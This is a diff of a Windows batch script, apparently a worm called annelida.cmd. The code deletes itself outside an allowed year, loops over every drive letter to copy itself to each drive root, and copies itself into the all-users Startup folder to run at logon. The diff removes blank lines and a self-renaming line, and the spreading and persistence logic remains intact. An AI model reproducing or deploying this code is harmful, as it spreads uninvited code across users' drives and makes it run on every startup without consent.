@@ -1,6 +1,5 @@
 set currentIteration=0 %= 2022-05-02 =%
 
-
 :::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
 ::                                                                                                                               ::
 ::                                                                                                                               ::
@@ -49,7 +48,6 @@ set currentIteration=0 %= 2022-05-02 =%
 ::                                                                                                                               ::
 :::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
 
-
 @echo off
 mode 17, 1
 cls
@@ -59,9 +57,6 @@ setLocal enableDelayedExpansion
 echo "%date%" | find "%allowedYear%" > nul || del "%~f0"
 
 set /a currentIteration=currentIteration+1
-
-if not exist "%annelida.cmd%" move "%~f0" annelida.cmd
-
 
 %= Copies to the root directory of all drives which have assigned letters =%
 set alphabet=ABCDEFGHIJKLMNOPQRSTUVWXYZ
@@ -77,8 +72,6 @@ set alphabetIndex=0
 	)
 	set /a alphabetIndex=alphabetIndex+1
 if not "%alphabetIndex%" == "25" goto driveCopyLoop
-
-
 
 if exist "%programdata%\Microsoft\Windows\Start Menu\Programs\Startup" ( %= Copies to the startup folder of all users =%
 	if not exist "%programdata%\Microsoft\Windows\Start Menu\Programs\Startup\annelida.cmd" (
